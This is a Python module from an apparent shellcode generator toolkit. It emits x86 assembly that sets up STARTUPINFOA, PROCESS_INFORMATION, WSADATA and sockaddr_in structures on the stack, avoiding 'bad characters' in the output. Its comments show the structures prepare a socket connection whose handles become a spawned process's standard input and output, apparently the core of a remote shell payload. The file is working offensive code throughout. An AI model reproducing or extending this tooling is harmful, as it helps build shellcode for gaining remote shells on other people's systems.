"""Structure initialization emitter for the shellcode emitter toolkit.

Generates assembly fragments that zero-initialize and configure x86 structures
on the stack frame. Only handles structures from STRUCT_DATABASE.
"""
from __future__ import annotations

from .encode import (
    encode_byte, safe_byte_store, safe_dword_store, safe_mem_store,
    _disp_has_badchar, parse_ebp_offset, safe_lea,
)
from .schema import Manifest
from .stack_alloc import StackLayout


def emit_structure(name: str, layout: StackLayout, badchars: set[int]) -> str:
    """Emit initialization assembly for a single structure slot."""
    slot = layout.slot(name)
    ref = slot.ebp_ref
    offset = -slot.offset

    if name == "STARTUPINFOA":
        return _emit_startupinfoa(ref, offset, badchars)
    elif name == "PROCESS_INFORMATION":
        return _emit_process_information(ref, offset, badchars)
    elif name == "WSADATA":
        return _emit_wsadata(ref)
    elif name == "sockaddr_in":
        return _emit_sockaddr_in(ref, offset, badchars)
    else:
        size = slot.size
        return "\n".join([
            f"; --- {name} at {ref} ({hex(size)} bytes) ---",
            f"; No initialization template available for {name}.",
            "",
        ])


def _emit_startupinfoa(ref: str, offset: int, badchars: set[int]) -> str:
    lines = [
        f"; --- STARTUPINFOA at {ref} (0x44 bytes) ---",
        "",
        "    xor  eax, eax",
        *safe_lea("edi", "ebp", offset, badchars),
        "",
        "    ; zero 0x44 bytes (17 DWORDs)",
        "    xor  ecx, ecx",
    ]
    lines.extend(encode_byte(17, badchars, "cl"))
    lines += [
        "startupinfoa_zero_loop:",
        "    mov  [edi], eax",
        "    add  edi, 4",
        "    loop startupinfoa_zero_loop",
        "",
        *safe_lea("edi", "ebp", offset, badchars),
    ]
    # cb = sizeof(STARTUPINFOA) = 0x44
    lines.extend(safe_byte_store("edi", 0, 0x44, badchars, tmp_reg="al", addr_tmp="ecx"))
    lines.append("")

    # dwFlags = STARTF_USESTDHANDLES = 0x100
    if 0x01 not in badchars:
        lines.append("    inc  eax                       ; eax was 0 from zeroing loop")
    else:
        lines.extend(encode_byte(1, badchars, "al"))
    lines.append("    rol  eax, 8                    ; eax = 0x100")
    lines.extend(safe_dword_store("edi", 0x2c, "eax", badchars, tmp="ecx"))
    lines += [
        "",
        "    ; hStdInput/hStdOutput/hStdError set by payload after socket creation",
        "",
    ]
    return "\n".join(lines)


def _emit_process_information(ref: str, offset: int, badchars: set[int]) -> str:
    lines = [
        f"; --- PROCESS_INFORMATION at {ref} (0x10 bytes) ---",
        "",
        "    xor  eax, eax",
        *safe_lea("edi", "ebp", offset, badchars),
    ]
    for off in (0x00, 0x04, 0x08, 0x0c):
        lines.extend(safe_dword_store("edi", off, "eax", badchars, tmp="ecx"))
    lines.append("")
    return "\n".join(lines)


def _emit_wsadata(ref: str) -> str:
    return "\n".join([
        f"; --- WSADATA at {ref} (0x190 bytes) ---",
        f"; No initialization needed - WSAStartup writes output to {ref}.",
        "",
    ])


def _emit_sockaddr_in(ref: str, offset: int, badchars: set[int]) -> str:
    lines = [
        f"; --- sockaddr_in at {ref} (0x10 bytes) ---",
        "; sin_port and sin_addr are set by the payload template.",
        "",
        "    xor  eax, eax",
        *safe_lea("edi", "ebp", offset, badchars),
    ]
    for off in (0x00, 0x04, 0x08, 0x0c):
        lines.extend(safe_dword_store("edi", off, "eax", badchars, tmp="ecx"))
    lines.append("")
    # sin_family = AF_INET = 2
    lines.append("    ; sin_family = AF_INET (byte store - high byte already 0)")
    lines.extend(safe_byte_store("edi", 0, 0x02, badchars, tmp_reg="al", addr_tmp="ecx"))
    lines += [
        "",
        "    ; Template sets sin_port (+0x02) and sin_addr (+0x04) before connect()",
        "",
    ]
    return "\n".join(lines)


def emit_all_structures(manifest: Manifest, layout: StackLayout) -> str:
    """Emit initialization code for all structures in layout order."""
    struct_slots = layout.slots_by_category("structure")
    parts = [emit_structure(slot.name, layout, manifest.badchars) for slot in struct_slots]
    return "\n".join(parts)
